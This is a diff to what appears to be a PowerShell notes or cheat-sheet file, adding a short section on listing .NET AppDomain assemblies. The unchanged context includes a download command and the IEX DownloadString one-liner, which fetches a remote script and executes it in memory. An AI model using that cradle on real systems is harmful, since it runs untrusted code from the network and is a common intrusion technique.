@@ -138,6 +138,15 @@ Invoke-WebRequest -Uri "http://server/script.ps1" -OutFile "C:\script.ps1"
 IEX (New-Object Net.WebClient).DownloadString("http://server/script.ps1")
 ```
 
+
+
+### .NET AppDomain
+
+```powershell
+[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
+[appdomain]::CreateDomain("PluginDomain");  
+```
+
 ## Resources
 
 - [Microsoft PowerShell Docs](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/03-discovering-objects?view=powershell-7.4)
